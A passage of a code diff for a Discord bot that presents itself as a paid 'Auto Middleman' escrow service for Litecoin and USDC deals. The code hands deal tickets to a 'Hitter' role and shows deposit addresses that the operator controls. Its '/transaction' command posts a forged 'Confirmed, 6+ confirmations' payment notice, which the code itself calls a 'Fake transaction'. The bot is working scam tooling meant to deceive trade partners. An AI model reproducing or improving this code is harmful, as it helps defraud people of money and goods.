-    const added = newM.roles.cache.filter(r => !oldM.roles.cache.has(r.id));
-    const removed = oldM.roles.cache.filter(r => !newM.roles.cache.has(r.id));
-    if (added.has(HITTER_ROLE_ID)) console.log(`[ROLE] +HITTER ${newM.user.tag}`);
-    if (removed.has(HITTER_ROLE_ID)) console.log(`[ROLE] -HITTER ${newM.user.tag}`);
-    if (added.has(FINANCE_ROLE_ID)) console.log(`[ROLE] +FINANCE ${newM.user.tag}`);
-    if (removed.has(FINANCE_ROLE_ID)) console.log(`[ROLE] -FINANCE ${newM.user.tag}`);
-});
-
-client.on(Events.InteractionCreate, async (interaction) => {
-    if (!interaction.isChatInputCommand()) return;
-    
-    const { commandName, member, user, channel } = interaction;
-    console.log(`[CMD] /${commandName} by ${user.tag}`);
-
-    const deny = (msg) => interaction.reply({ content: `❌ ${msg}`, ephemeral: true });
-
-    try {
-        switch (commandName) {
-            case 'panel':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                
-                const infoEmbed = new EmbedBuilder()
-                    .setTitle("Jace's Auto Middleman")
-                    .setDescription('• Paid Service\n• Read our ToS before using the bot: #tos-crypto')
-                    .setColor(0x2B2D31);
-                
-                const feesEmbed = new EmbedBuilder()
-                    .setTitle('Fees:')
-                    .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
-                    .setColor(0x2B2D31);
-                
-                const ltcEmbed = new EmbedBuilder()
-                    .setTitle('Ł • Request Litecoin • Ł')
-                    .setColor(0x2B2D31);
-                
-                const ltcRow = new ActionRowBuilder()
-                    .addComponents(
-                        new ButtonBuilder()
-                            .setCustomId('request_ltc')
-                            .setLabel('Request LTC')
-                            .setStyle(ButtonStyle.Primary)
-                            .setEmoji('Ł')
-                    );
-                
-                const usdcEmbed = new EmbedBuilder()
-                    .setTitle('💲 • Request USDC')
-                    .setDescription('**[ERC-20]** • 💲\n• Network: **ETH (ERC-20)**')
-                    .setColor(0x2B2D31);
-                
-                const usdcRow = new ActionRowBuilder()
-                    .addComponents(
-                        new ButtonBuilder()
-                            .setCustomId('request_usdc')
-                            .setLabel('Request USDC [ERC-20]')
-                            .setStyle(ButtonStyle.Success)
-                            .setEmoji('💲')
-                    );
-                
-                await channel.send({ embeds: [infoEmbed, feesEmbed] });
-                await channel.send({ embeds: [ltcEmbed], components: [ltcRow] });
-                await channel.send({ embeds: [usdcEmbed], components: [usdcRow] });
-                
-                await interaction.deferReply({ ephemeral: true });
-                await interaction.deleteReply();
-                break;
-
-            case 'manual':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                
-                const manualEmbed = new EmbedBuilder()
-                    .setTitle('👤 Manual Middleman Service')
-                    .setDescription('Manual middleman service, Please follow the rules and wait patiently')
-                    .setColor(0xFFA500)
-                    .addFields(
-                        { name: 'Tier 1', value: 'Middleman ($200 or under)', inline: true },
-                        { name: 'Tier 2', value: 'Middleman ($500 and under)', inline: true },
-                        { name: 'Tier 3', value: 'Middleman ($1000+)', inline: true }
-                    );
-                
-                const manualRow = new ActionRowBuilder()
-                    .addComponents(
-                        new ButtonBuilder()
-                            .setCustomId('manual_tier1')
-                            .setLabel('Tier 1 ($200)')
-                            .setStyle(ButtonStyle.Primary)
-                            .setEmoji('🥉'),
-                        new ButtonBuilder()
-                            .setCustomId('manual_tier2')
-                            .setLabel('Tier 2 ($500)')
-                            .setStyle(ButtonStyle.Secondary)
-                            .setEmoji('🥈'),
-                        new ButtonBuilder()
-                            .setCustomId('manual_tier3')
-                            .setLabel('Tier 3 ($1000+)')
-                            .setStyle(ButtonStyle.Success)
-                            .setEmoji('🥇')
-                    );
-                
-                await channel.send({ embeds: [manualEmbed], components: [manualRow] });
-                await interaction.deferReply({ ephemeral: true });
-                await interaction.deleteReply();
-                break;
-
-            case 'embed':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                
-                const title = interaction.options.getString('title');
-                const description = interaction.options.getString('description');
-                const colorInput = interaction.options.getString('color') || '5865F2';
-                const color = parseInt(colorInput.replace('#', ''), 16) || 0x5865F2;
-                
-                const customEmbed = new EmbedBuilder()
-                    .setTitle(title)
-                    .setDescription(description)
-                    .setColor(color);
-                
-                await channel.send({ embeds: [customEmbed] });
-                await interaction.deferReply({ ephemeral: true });
-                await interaction.deleteReply();
-                break;
-
-            case 'tickets':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                client.config.TICKET_CATEGORY = interaction.options.getString('categoryid');
-                await interaction.reply({ content: `✅ Auto MM ticket category set.`, ephemeral: true });
-                break;
-
-            case 'manualcategory':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                client.config.MANUAL_CATEGORY = interaction.options.getString('categoryid');
-                await interaction.reply({ content: `✅ Manual MM ticket category set.`, ephemeral: true });
-                break;
-
-            case 'log':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                client.config.LOG_CHANNEL = interaction.options.getChannel('channel').id;
-                await interaction.reply({ content: '✅ Log channel set.', ephemeral: true });
-                break;
-
-            case 'heh':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                client.config.MONITOR_CHANNEL = interaction.options.getString('channelid');
-                await interaction.reply({ content: '✅ Monitor channel set.', ephemeral: true });
-                break;
-
-            case 'transaction':
-                if (!hasHitter(member) && !isOwner(user.id)) return deny('Hitter role required.');
-                const chId = interaction.options.getString('channelid');
-                const txChannel = await client.channels.fetch(chId).catch(() => null);
-                if (!txChannel) return deny('Invalid channel ID.');
-                
-                const fakeTx = generateFakeTransaction();
-                const txEmbed = new EmbedBuilder()
-                    .setTitle('🔔 New Transaction Detected')
-                    .setDescription(`**${fakeTx.amount} ${fakeTx.currency}** ($${fakeTx.usd.toFixed(2)})`)
-                    .addFields(
-                        { name: 'Transaction ID', value: `\`${fakeTx.txid}\``, inline: false },
-                        { name: 'Status', value: '✅ Confirmed', inline: true },
-                        { name: 'Confirmations', value: '6+', inline: true },
-                        { name: 'From', value: `\`${fakeTx.sender}\``, inline: true },
-                        { name: 'To', value: `\`${fakeTx.receiver}\``, inline: true }
-                    )
-                    .setColor(0x00FF00)
-                    .setTimestamp();
-                
-                await txChannel.send({ embeds: [txEmbed] });
-                await interaction.reply({ content: `✅ Fake transaction sent to <#${chId}>`, ephemeral: true });
-                break;
-
-            case 'close':
-                if (!interaction.channel.name.includes('ticket')) return deny('Not a ticket channel.');
-                await interaction.reply('🔒 Closing ticket in 5 seconds...');
-                setTimeout(() => interaction.channel.delete().catch(console.error), 5000);
-                break;
-
-            case 'say':
-                if (!isOwner(user.id)) return deny('Owner only.');
-                const sayChannel = interaction.options.getChannel('channel');
-                const sayMessage = interaction.options.getString('message');
-                await sayChannel.send(sayMessage);
-                await interaction.reply({ content: `✅ Message sent to ${sayChannel}`, ephemeral: true });
-                break;
-        }
-    } catch (err) {
-        console.error(`[ERR] /${commandName}:`, err);
-        if (!interaction.replied && !interaction.deferred) await interaction.reply({ content: '❌ Error occurred.', ephemeral: true });
-    }
-});
-
-client.on(Events.InteractionCreate, async (interaction) => {
-    if (!interaction.isButton()) return;
-    
-    const { customId, user } = interaction;
-    
-    if (customId === 'request_ltc') {
-        if (!client.config.TICKET_CATEGORY) {
-            return interaction.reply({ content: '❌ Ticket category not set. Use /tickets', ephemeral: true });
-        }
-
-        const modal = new ModalBuilder()
-            .setCustomId('ltc_ticket_modal')
-            .setTitle('LTC Deal Amount');
-        
-        const amountInput = new TextInputBuilder()
-            .setCustomId('amount')
-            .setLabel('Deal Amount (USD)')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('Enter amount in USD')
-            .setRequired(true);
-        
-        const row = new ActionRowBuilder().addComponents(amountInput);
-        modal.addComponents(row);
-        
-        await interaction.showModal(modal);
-    }
-    
-    if (customId === 'request_usdc') {
-        if (!client.config.TICKET_CATEGORY) {
-            return interaction.reply({ content: '❌ Ticket category not set. Use /tickets', ephemeral: true });
-        }
-
-        const modal = new ModalBuilder()
-            .setCustomId('usdc_ticket_modal')
-            .setTitle('USDC Deal Amount');
-        
-        const amountInput = new TextInputBuilder()
-            .setCustomId('amount')
-            .setLabel('Deal Amount (USD)')
-            .setStyle(TextInputStyle.Short)
-            .setPlaceholder('Enter amount in USD')
-            .setRequired(true);
-        
-        const row = new ActionRowBuilder().addComponents(amountInput);
-        modal.addComponents(row);
-        
-        await interaction.showModal(modal);
-    }
-    
-    if (customId.startsWith('manual_tier')) {
-        const tier = customId.replace('manual_tier', '');
-        const limits = { '1': 200, '2': 500, '3': 1000 };
-        const limit = limits[tier];
-        
-        if (!client.config.MANUAL_CATEGORY) {
-            return interaction.reply({ content: '❌ Manual MM category not set. Use /manualcategory', ephemeral: true });
-        }
-
-        try {
-            const ticketCh = await interaction.guild.channels.create({
-                name: `manual-${user.username}-t${tier}`,
-                parent: client.config.MANUAL_CATEGORY,
-                permissionOverwrites: [
-                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
-                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
-                ]
-            });
-
-            const embed = new EmbedBuilder()
-                .setTitle(`👤 Manual Middleman | Tier ${tier}`)
-                .setDescription(`Welcome <@${user.id}>\n**Trade Limit: $${limit}**`)
-                .addFields(
-                    { name: 'Deposit Address (LTC)', value: `\`${LTC_ADDRESS}\``, inline: false },
-                    { name: 'Network', value: 'Litecoin', inline: true },
-                    { name: 'Status', value: '⏳ Waiting for middleman...', inline: true }
-                )
-                .setColor(0xBFBBBB);
-
-            const row = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder()
-                        .setCustomId('close_ticket')
-                        .setLabel('Close Ticket')
-                        .setStyle(ButtonStyle.Danger)
-                );
-
-            await ticketCh.send({ content: `<@${user.id}> <@&${HITTER_ROLE_ID}>`, embeds: [embed], components: [row] });
-            await interaction.reply({ content: `✅ Manual MM ticket created: ${ticketCh}`, ephemeral: true });
-            
-            client.activeTickets.set(ticketCh.id, { userId: user.id, tier, type: 'manual', limit, createdAt: Date.now() });
-
-        } catch (e) {
-            console.error('[MANUAL TICKET ERR]', e);
-            await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
-        }
+            const c = await i.guild.channels.create({ name: `manual-${user.username}-t${tier}`, parent: client.config.MANUAL_CATEGORY, permissionOverwrites: [{ id: i.guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
+            const e = new EmbedBuilder().setTitle(`👤 Manual | Tier ${tier}`).setDescription(`<@${user.id}>\n**Limit: $${limits[tier]}**`).addFields({ name: 'LTC Address', value: `\`${LTC_ADDRESS}\``, inline: false }, { name: 'Network', value: 'Litecoin', inline: true }, { name: 'Status', value: '⏳ Waiting...', inline: true }).setColor(0xBFBBBB);
+            const r = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger));
+            await c.send({ content: `<@${user.id}>`, embeds: [e], components: [r] });
+            await i.reply({ content: `✅ ${c}`, ephemeral: true });
+            client.activeTickets.set(c.id, { userId: user.id, tier, type: 'manual' });
+        } catch (e) { await i.reply({ content: '❌ Failed', ephemeral: true }); }
     }
 
     if (customId === 'close_ticket') {
-        await interaction.reply('🔒 Closing ticket...');
-        await interaction.channel.delete().catch(() => {});
+        await i.reply('🔒 Closing...');
+        await i.channel.delete().catch(() => {});
     }
 });
 
-client.on(Events.InteractionCreate, async (interaction) => {
-    if (!interaction.isModalSubmit()) return;
-    
-    if (interaction.customId === 'ltc_ticket_modal') {
-        const amount = interaction.fields.getTextInputValue('amount');
-        
+client.on(Events.InteractionCreate, async (i) => {
+    if (!i.isModalSubmit()) return;
+    const amt = i.fields.getTextInputValue('amount');
+
+    if (i.customId === 'ltc_modal') {
         try {
-            await interaction.deferReply({ ephemeral: true });
-            
-            const ticketCh = await interaction.guild.channels.create({
-                name: `ltc-${interaction.user.username}-${amount}`,
-                parent: client.config.TICKET_CATEGORY,
-                permissionOverwrites: [
-                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
-                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
-                ]
-            });
-
-            const embed = new EmbedBuilder()
-                .setTitle(`🤖 Auto Middleman | LTC`)
-                .setDescription(`Welcome <@${interaction.user.id}>\n**Deal Amount: $${amount}**`)
-                .addFields(
-                    { name: 'Deposit Address', value: `\`${LTC_ADDRESS}\``, inline: false },
-                    { name: 'Network', value: 'Litecoin', inline: true },
-                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true },
-                    { name: 'Note', value: 'Send exact amount. Funds will be released after confirmation.', inline: false }
-                )
-                .setColor(0xBFBBBB);
-
-            const row = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder()
-                        .setCustomId('close_ticket')
-                        .setLabel('Close Ticket')
-                        .setStyle(ButtonStyle.Danger)
-                );
-
-            await ticketCh.send({ content: `<@${interaction.user.id}>`, embeds: [embed], components: [row] });
-            await interaction.editReply({ content: `✅ LTC ticket created: ${ticketCh}` });
-            
-            client.activeTickets.set(ticketCh.id, { 
-                userId: interaction.user.id, 
-                crypto: 'LTC',
-                amount,
-                type: 'auto',
-                createdAt: Date.now() 
-            });
-
-        } catch (e) {
-            console.error('[LTC TICKET ERR]', e);
-            if (interaction.deferred) {
-                await interaction.editReply({ content: '❌ Failed to create ticket.' });
-            } else {
-                await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
-            }
-        }
+            await i.deferReply({ ephemeral: true });
+            const c = await i.guild.channels.create({ name: `ltc-${i.user.username}-${amt}`, parent: client.config.TICKET_CATEGORY, permissionOverwrites: [{ id: i.guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: i.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
+            const e = new EmbedBuilder().setTitle('🤖 Auto | LTC').setDescription(`<@${i.user.id}>\n**$${amt}**`).addFields({ name: 'Address', value: `\`${LTC_ADDRESS}\``, inline: false }, { name: 'Network', value: 'Litecoin', inline: true }, { name: 'Status', value: '⏳ Awaiting...', inline: true }).setColor(0xBFBBBB);
+            const r = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger));
+            await c.send({ content: `<@${i.user.id}>`, embeds: [e], components: [r] });
+            await i.editReply({ content: `✅ ${c}` });
+            client.activeTickets.set(c.id, { userId: i.user.id, crypto: 'LTC', amount: amt, type: 'auto' });
+        } catch (e) { await i.editReply({ content: '❌ Failed' }); }
     }
-    
-    if (interaction.customId === 'usdc_ticket_modal') {
-        const amount = interaction.fields.getTextInputValue('amount');
-        
+
+    if (i.customId === 'usdc_modal') {
         try {
-            await interaction.deferReply({ ephemeral: true });
-            
-            const ticketCh = await interaction.guild.channels.create({
-                name: `usdc-${interaction.user.username}-${amount}`,
-                parent: client.config.TICKET_CATEGORY,
-                permissionOverwrites: [
-                    { id: interaction.guild.id, deny: [PermissionFlagsBits.ViewChannel] },
-                    { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                    { id: HITTER_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
-                    { id: FINANCE_ROLE_ID, allow: [PermissionFlagsBits.ViewChannel] }
-                ]
-            });
-
-            const embed = new EmbedBuilder()
-                .setTitle(`🤖 Auto Middleman | USDC`)
-                .setDescription(`Welcome <@${interaction.user.id}>\n**Deal Amount: $${amount}**`)
-                .addFields(
-                    { name: 'Deposit Address', value: `\`${USDC_ADDRESS}\``, inline: false },
-                    { name: 'Network', value: 'Ethereum (ERC-20)', inline: true },
-                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true },
-                    { name: 'Note', value: 'Send exact amount. Funds will be released after confirmation.', inline: false }
-                )
-                .setColor(0x2775CA);
-
-            const row = new ActionRowBuilder()
-                .addComponents(
-                    new ButtonBuilder()
-                        .setCustomId('close_ticket')
-                        .setLabel('Close Ticket')
-                        .setStyle(ButtonStyle.Danger)
-                );
-
-            await ticketCh.send({ content: `<@${interaction.user.id}>`, embeds: [embed], components: [row] });
-            await interaction.editReply({ content: `✅ USDC ticket created: ${ticketCh}` });
-            
-            client.activeTickets.set(ticketCh.id, { 
-                userId: interaction.user.id, 
-                crypto: 'USDC',
-                amount,
-                type: 'auto',
-                createdAt: Date.now() 
-            });
-
-        } catch (e) {
-            console.error('[USDC TICKET ERR]', e);
-            if (interaction.deferred) {
-                await interaction.editReply({ content: '❌ Failed to create ticket.' });
-            } else {
-                await interaction.reply({ content: '❌ Failed to create ticket.', ephemeral: true });
-            }
-        }
+            await i.deferReply({ ephemeral: true });
+            const c = await i.guild.channels.create({ name: `usdc-${i.user.username}-${amt}`, parent: client.config.TICKET_CATEGORY, permissionOverwrites: [{ id: i.guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: i.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
+            const e = new EmbedBuilder().setTitle('🤖 Auto | USDC').setDescription(`<@${i.user.id}>\n**$${amt}**`).addFields({ name: 'Address', value: `\`${USDC_ADDRESS}\``, inline: false }, { name: 'Network', value: 'Ethereum (ERC-20)', inline: true }, { name: 'Status', value: '⏳ Awaiting...', inline: true }).setColor(0x2775CA);
+            const r = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger));
+            await c.send({ content: `<@${i.user.id}>`, embeds: [e], components: [r] });
+            await i.editReply({ content: `✅ ${c}` });
+            client.activeTickets.set(c.id, { userId: i.user.id, crypto: 'USDC', amount: amt, type: 'auto' });
+        } catch (e) { await i.editReply({ content: '❌ Failed' }); }
     }
 });
 
-client.login(process.env.DISC
+client.login(process.env.DISCORD_TOKEN);
